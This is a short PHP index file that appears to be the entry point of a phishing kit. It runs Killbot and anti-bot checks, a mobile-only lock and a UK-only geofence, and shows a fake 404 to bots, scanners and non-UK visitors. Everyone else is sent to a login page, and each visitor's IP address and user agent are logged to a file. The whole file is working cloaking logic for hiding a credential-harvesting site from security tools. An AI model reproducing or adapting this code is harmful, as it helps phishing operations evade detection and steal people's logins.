<?php
include 'auth/conn.php';
include 'auth/connect.php';
include 'auth/blocker.php';
if($enable_killbot == 1){
  if(checkkillbot($killbot_key) == true){
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($mobile_only == 1){
  include 'auth/mobile_lock.php';
}
if($external_antibot == 1){
  if(checkBot($apikey) == true){
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}
if($uk_lock == 1){
  if(onlyUK() == true){
  
  }else{
    header_remove();
    header("Connection: close\r\n");
    http_response_code(404);
    exit;
  }
}

header("location:login.php");
$fp = fopen('logger.js', 'a');
  fwrite($fp, $_SERVER['REMOTE_ADDR']." : ".$_SERVER['HTTP_USER_AGENT']."\n");
  fclose($fp);
?>